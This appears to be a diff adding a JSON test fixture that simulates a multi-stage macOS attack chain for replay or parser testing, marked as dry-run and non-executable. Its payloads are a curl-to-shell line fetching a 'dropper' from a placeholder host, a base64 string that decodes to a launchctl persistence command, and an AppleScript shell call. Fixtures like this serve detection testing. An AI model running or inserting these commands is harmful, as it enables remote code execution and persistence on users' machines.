@@ -1,0 +1,22 @@
+{
+  "sample_id": "suspicious_hybrid_chain_sim_01",
+  "dry_run": true,
+  "steps": [
+    {
+      "phase": "shell",
+      "action": "echo",
+      "payload": "curl -s https://evil.example.invalid/dropper | sh"
+    },
+    {
+      "phase": "python",
+      "action": "string_decode",
+      "payload": "YmFzaCAtYyAnbGF1bmNoY3RsIGxvYWQgLi4uJw=="
+    },
+    {
+      "phase": "applescript",
+      "action": "display_dialog",
+      "payload": "do shell script 'osascript -e ...'"
+    }
+  ],
+  "enforcement": "No step is executable; replay or parser testing only."
+}
